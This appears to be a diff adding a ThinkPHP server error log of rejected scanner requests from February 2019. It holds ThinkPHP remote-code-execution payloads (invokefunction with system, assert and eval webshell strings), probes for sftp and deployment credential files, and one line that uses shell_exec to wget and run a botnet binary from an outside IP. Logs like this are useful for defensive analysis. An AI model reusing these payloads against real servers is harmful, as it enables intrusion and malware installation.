@@ -1,0 +1,201 @@
+[ 2019-02-22T03:31:07+08:00 ] 54.183.175.213 /CHANGELOG.txt
+ERR: 无法加载控制器:CHANGELOG.txt
+
+[ 2019-02-22T12:57:35+08:00 ] 154.223.166.141 /?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-02-22T12:57:36+08:00 ] 154.223.166.141 /?s=captcha&test=echo+%5Czx%5Ccvb%5Cnm%5Ezx%5Ecvb%5Enm
+ERR: 无法加载控制器:Captcha
+
+[ 2019-02-22T12:57:37+08:00 ] 154.223.166.141 /?s=captcha&test=phpinfo()
+ERR: 无法加载控制器:Captcha
+
+[ 2019-02-22T12:57:38+08:00 ] 154.223.166.141 /?s=captcha&test=1
+ERR: 无法加载控制器:Captcha
+
+[ 2019-02-22T12:57:39+08:00 ] 154.223.166.141 /?s=getverify&test=1
+ERR: 无法加载控制器:Getverify
+
+[ 2019-02-22T12:57:48+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5Cconfig/get&name=database.datetime_format
+ERR: 非法操作:\think\config
+
+[ 2019-02-22T12:57:49+08:00 ] 154.223.166.141 /?s=.%7Cthink%5Cconfig/get&name=database.datetime_format
+ERR: 无法加载控制器:.|think\config
+
+[ 2019-02-22T12:57:50+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5Capp/invokefunction&function=pi&vars%5B0%5D=1
+ERR: 非法操作:\think\app
+
+[ 2019-02-22T12:57:51+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=pi&vars%5B1%5D%5B%5D=1
+ERR: 非法操作:\think\app
+
+[ 2019-02-22T12:57:52+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=assert&vars%5B1%5D%5B%5D=phpinfo()
+ERR: 非法操作:\think\app
+
+[ 2019-02-22T12:57:54+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo+%5Czx%5Ccvb%5Cnm%5Ezx%5Ecvb%5Enm
+ERR: 非法操作:\think\app
+
+[ 2019-02-22T12:57:54+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5CRequest/cache&key=echo+%5Czx%5Ccvb%5Cnm%5Ezx%5Ecvb%5Enm%7Csystem
+ERR: 非法操作:\think\Request
+
+[ 2019-02-22T12:57:55+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5CRequest/cache&key=1%7Cphpinfo
+ERR: 非法操作:\think\Request
+
+[ 2019-02-22T12:57:56+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5CView/display&content=%3C?php%20phpinfo();?%3E&data=1
+ERR: 非法操作:\think\View
+
+[ 2019-02-22T12:57:56+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5CRequest/input?filter=assert&data%5B%5D=phpinfo()
+ERR: 非法操作:\think\Request
+
+[ 2019-02-22T12:57:58+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5CRequest/input&filter=system&data=echo+%5Czx%5Ccvb%5Cnm%5Ezx%5Ecvb%5Enm
+ERR: 非法操作:\think\Request
+
+[ 2019-02-22T12:57:59+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5CRequest/input&filter=pi&data=1
+ERR: 非法操作:\think\Request
+
+[ 2019-02-22T12:58:00+08:00 ] 154.223.166.141 /?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=pi&vars%5B1%5D%5B%5D=1
+ERR: 非法操作:\think\Container
+
+[ 2019-02-22T12:58:03+08:00 ] 154.223.166.141 /?s=captcha&test=@++eval++(++$_POST++%5B++a++%5D++)++;
+ERR: 无法加载控制器:Captcha
+
+[ 2019-02-22T15:49:07+08:00 ] 185.234.218.74 /sftp-config.json
+ERR: 无法加载控制器:Sftp-config.json
+
+[ 2019-02-22T15:49:07+08:00 ] 185.234.218.74 /beta/sftp-config.json
+ERR: 无法加载控制器:Beta
+
+[ 2019-02-22T15:49:07+08:00 ] 185.234.218.74 /dev/sftp-config.json
+ERR: 无法加载控制器:Dev
+
+[ 2019-02-22T15:49:09+08:00 ] 185.234.218.74 /stag/sftp-config.json
+ERR: 无法加载控制器:Stag
+
+[ 2019-02-22T15:49:09+08:00 ] 185.234.218.74 /stage/sftp-config.json
+ERR: 无法加载控制器:Stage
+
+[ 2019-02-22T15:49:10+08:00 ] 185.234.218.74 /test/sftp-config.json
+ERR: 无法加载控制器:Test
+
+[ 2019-02-22T15:49:10+08:00 ] 185.234.218.74 /www/sftp-config.json
+ERR: 无法加载控制器:Www
+
+[ 2019-02-22T15:49:12+08:00 ] 185.234.218.74 /site/sftp-config.json
+ERR: 无法加载控制器:Site
+
+[ 2019-02-22T15:49:13+08:00 ] 185.234.218.74 /website/sftp-config.json
+ERR: 无法加载控制器:Website
+
+[ 2019-02-22T15:49:13+08:00 ] 185.234.218.74 /web/sftp-config.json
+ERR: 无法加载控制器:Web
+
+[ 2019-02-22T15:49:14+08:00 ] 185.234.218.74 /wp/sftp-config.json
+ERR: 无法加载控制器:Wp
+
+[ 2019-02-22T15:49:14+08:00 ] 185.234.218.74 /api/sftp-config.json
+ERR: 无法加载控制器:Api
+
+[ 2019-02-22T15:49:15+08:00 ] 185.234.218.74 /m/sftp-config.json
+ERR: 无法加载控制器:M
+
+[ 2019-02-22T15:49:15+08:00 ] 185.234.218.74 /public/sftp-config.json
+ERR: 无法加载控制器:Public
+
+[ 2019-02-22T15:49:50+08:00 ] 185.234.218.74 /deployment-config.json
+ERR: 无法加载控制器:Deployment-config.json
+
+[ 2019-02-22T15:49:50+08:00 ] 185.234.218.74 /beta/deployment-config.json
+ERR: 无法加载控制器:Beta
+
+[ 2019-02-22T15:49:50+08:00 ] 185.234.218.74 /dev/deployment-config.json
+ERR: 无法加载控制器:Dev
+
+[ 2019-02-22T15:49:51+08:00 ] 185.234.218.74 /stag/deployment-config.json
+ERR: 无法加载控制器:Stag
+
+[ 2019-02-22T15:49:51+08:00 ] 185.234.218.74 /stage/deployment-config.json
+ERR: 无法加载控制器:Stage
+
+[ 2019-02-22T15:49:52+08:00 ] 185.234.218.74 /test/deployment-config.json
+ERR: 无法加载控制器:Test
+
+[ 2019-02-22T15:49:52+08:00 ] 185.234.218.74 /www/deployment-config.json
+ERR: 无法加载控制器:Www
+
+[ 2019-02-22T15:49:53+08:00 ] 185.234.218.74 /site/deployment-config.json
+ERR: 无法加载控制器:Site
+
+[ 2019-02-22T15:49:53+08:00 ] 185.234.218.74 /website/deployment-config.json
+ERR: 无法加载控制器:Website
+
+[ 2019-02-22T15:49:53+08:00 ] 185.234.218.74 /web/deployment-config.json
+ERR: 无法加载控制器:Web
+
+[ 2019-02-22T15:49:54+08:00 ] 185.234.218.74 /wp/deployment-config.json
+ERR: 无法加载控制器:Wp
+
+[ 2019-02-22T15:49:54+08:00 ] 185.234.218.74 /api/deployment-config.json
+ERR: 无法加载控制器:Api
+
+[ 2019-02-22T15:49:55+08:00 ] 185.234.218.74 /m/deployment-config.json
+ERR: 无法加载控制器:M
+
+[ 2019-02-22T15:49:55+08:00 ] 185.234.218.74 /public/deployment-config.json
+ERR: 无法加载控制器:Public
+
+[ 2019-02-22T15:49:56+08:00 ] 185.234.218.74 /ftpsync.settings
+ERR: 无法加载控制器:Ftpsync.settings
+
+[ 2019-02-22T15:49:56+08:00 ] 185.234.218.74 /beta/ftpsync.settings
+ERR: 无法加载控制器:Beta
+
+[ 2019-02-22T15:49:57+08:00 ] 185.234.218.74 /dev/ftpsync.settings
+ERR: 无法加载控制器:Dev
+
+[ 2019-02-22T15:49:58+08:00 ] 185.234.218.74 /stag/ftpsync.settings
+ERR: 无法加载控制器:Stag
+
+[ 2019-02-22T15:49:58+08:00 ] 185.234.218.74 /stage/ftpsync.settings
+ERR: 无法加载控制器:Stage
+
+[ 2019-02-22T15:49:58+08:00 ] 185.234.218.74 /test/ftpsync.settings
+ERR: 无法加载控制器:Test
+
+[ 2019-02-22T15:49:59+08:00 ] 185.234.218.74 /www/ftpsync.settings
+ERR: 无法加载控制器:Www
+
+[ 2019-02-22T15:49:59+08:00 ] 185.234.218.74 /site/ftpsync.settings
+ERR: 无法加载控制器:Site
+
+[ 2019-02-22T15:50:00+08:00 ] 185.234.218.74 /website/ftpsync.settings
+ERR: 无法加载控制器:Website
+
+[ 2019-02-22T15:50:00+08:00 ] 185.234.218.74 /web/ftpsync.settings
+ERR: 无法加载控制器:Web
+
+[ 2019-02-22T15:50:02+08:00 ] 185.234.218.74 /wp/ftpsync.settings
+ERR: 无法加载控制器:Wp
+
+[ 2019-02-22T15:50:02+08:00 ] 185.234.218.74 /api/ftpsync.settings
+ERR: 无法加载控制器:Api
+
+[ 2019-02-22T15:50:02+08:00 ] 185.234.218.74 /m/ftpsync.settings
+ERR: 无法加载控制器:M
+
+[ 2019-02-22T15:50:03+08:00 ] 185.234.218.74 /public/ftpsync.settings
+ERR: 无法加载控制器:Public
+
+[ 2019-02-22T16:43:25+08:00 ] 115.159.186.223 /wls-wsat/CoordinatorPortType
+ERR: 无法加载控制器:Wls-wsat
+
+[ 2019-02-22T18:24:13+08:00 ] 14.23.93.146 /sdk
+ERR: 无法加载控制器:Sdk
+
+[ 2019-02-22T18:24:18+08:00 ] 14.23.93.146 /nmaplowercheck1550831045
+ERR: 无法加载控制器:Nmaplowercheck1550831045
+
+[ 2019-02-22T18:24:18+08:00 ] 14.23.93.146 /HNAP1
+ERR: 无法加载控制器:HNAP1
+
+[ 2019-02-22T22:42:58+08:00 ] 134.209.10.161 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http%3A%2F%2F142.93.82.179%2Fbins%2Fapep.x86%20-O%20%2Ftmp%2F.gayboi%3B%20chmod%20777%20%2Ftmp%2F.gayboi%3B%20%2Ftmp%2F.gayboi%20thinkphp.x86
+ERR: 非法操作:\think\app
+
